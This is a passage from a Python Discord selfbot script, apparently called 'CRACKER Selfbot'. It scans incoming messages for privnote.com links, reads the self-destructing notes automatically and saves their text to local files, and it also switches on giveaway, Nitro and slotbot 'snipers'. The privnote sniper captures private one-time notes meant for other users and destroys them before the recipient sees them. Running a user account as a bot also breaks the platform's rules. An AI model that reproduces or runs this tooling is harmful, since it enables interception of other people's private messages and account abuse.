            code=re.search('privnote.com/(.*)', message.content).group(1)
            link='https://privnote.com/'+code
            try:
                note_text=pn.read_note(link)
            except Exception as e:
                print(e)
            with open(f'Privnote/{code}.txt', 'a+') as f:
                print(""
                      f"\n{Fore.CYAN}[{time} - Privnote Sniped]"+Fore.RESET)
                PrivnoteData(code)
                f.write(note_text)
        else:
            return
    await Alucard.process_commands(message)


@Alucard.event
async def on_connect():
    Clear()

    if giveaway_sniper == True:
        giveaway="Active"
    else:
        giveaway="Disabled"

    if nitro_sniper == True:
        nitro="Active"
    else:
        nitro="Disabled"

    if slotbot_sniper == True:
        slotbot="Active"
    else:
        slotbot="Disabled"

    if privnote_sniper == True:
        privnote="Active"
    else:
        privnote="Disabled"

    startprint()
    # ctypes.windll.kernel32.SetConsoleTitleW(
        # f'[CRACKER Selfbot v{SELFBOT.__version__}] | Logged in as {Alucard.user.name}')


@Alucard.event
async def on_command_error(ctx, error):
    error_str=str(error)
    error=getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(
            f"{Fore.RED}[ERROR]: {Fore.YELLOW}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(
            f"{Fore.RED}[ERROR]: {Fore.YELLOW}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(
            f"{Fore.RED}[ERROR]: {Fore.YELLOW}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(
            f"{Fore.RED}[ERROR]: {Fore.YELLOW}Couldnt send a empty message"+Fore.RESET)
    else:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{error_str}"+Fore.RESET)

if __name__ == '__main__':
    Init()
